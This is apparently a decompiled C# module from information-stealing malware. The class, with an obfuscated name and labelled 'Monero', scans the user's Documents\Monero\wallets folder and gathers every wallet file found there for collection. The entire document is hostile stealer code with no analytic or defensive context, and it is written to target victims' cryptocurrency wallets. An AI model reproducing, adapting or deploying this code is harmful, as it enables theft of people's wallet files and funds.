using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000029 RID: 41
public class mYDict : FileScanner
{
	// Token: 0x060000D5 RID: 213 RVA: 0x0000392B File Offset: 0x00001B2B
	public mYDict()
	{
		base.Name = "Monero";
	}

	// Token: 0x060000D6 RID: 214 RVA: 0x00003941 File Offset: 0x00001B41
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.ExpandEnvironmentVariables("%userprofile%\\Documents") + "\\", string.Empty);
	}

	// Token: 0x060000D7 RID: 215 RVA: 0x00008E6C File Offset: 0x0000706C
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.ExpandEnvironmentVariables("%userprofile%\\Documents") + "\\Monero\\wallets";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = new string(new char[]
				{
					'*'
				}),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
